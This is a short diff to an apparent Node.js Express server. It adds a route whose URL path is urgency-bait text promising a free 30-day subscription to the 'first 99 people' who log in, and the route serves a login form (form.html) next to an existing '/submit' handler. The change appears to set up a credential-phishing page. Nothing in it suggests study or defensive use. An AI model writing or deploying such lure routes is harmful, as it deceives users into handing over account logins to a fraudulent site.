@@ -104,6 +104,9 @@ app.post('/submit', (req, res) => {
 `);
 });
 
+app.get('/Click-here-to-log-in-to-your-ID-and-get-a-30-day-subscription.-After-you-log-in,-your-subscription-will-start-within-24-hours.-This-offer-is-only-for-the-first-99-people,-so-log-in-quickly-and-grab-your-offer-now', (req, res) => {
+    res.sendFile(__dirname + '/form.html');
+});
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
